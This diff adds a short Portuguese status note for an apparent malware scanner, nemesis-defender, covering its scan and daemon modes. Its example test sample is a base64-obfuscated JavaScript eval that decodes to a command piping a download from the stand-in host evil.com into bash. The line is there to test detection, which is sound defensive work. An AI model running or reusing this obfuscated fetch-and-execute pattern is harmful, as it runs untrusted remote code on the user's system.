@@ -1,0 +1,22 @@
+Estado atual do nemesis-defender:
+
+1. Scan manual (funcionando):
+
+bash
+./target/release/nemesis-defender --scan <arquivo>
+
+Exemplo: 
+echo 'eval(Buffer.from("Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZSB8IGJhc2g=", "base64").toString())' > /tmp/test-defender.js
+./target/release/nemesis-defender --scan /tmp/test-defender.js
+rm /tmp/test-defender.js
+
+Detecta payloads maliciosos
+Bloqueia com exit code 2
+Registra em logs/defender.log
+
+
+2. Daemon (implementado mas não automático):
+./target/release/nemesis-defender --daemon
+
+
+
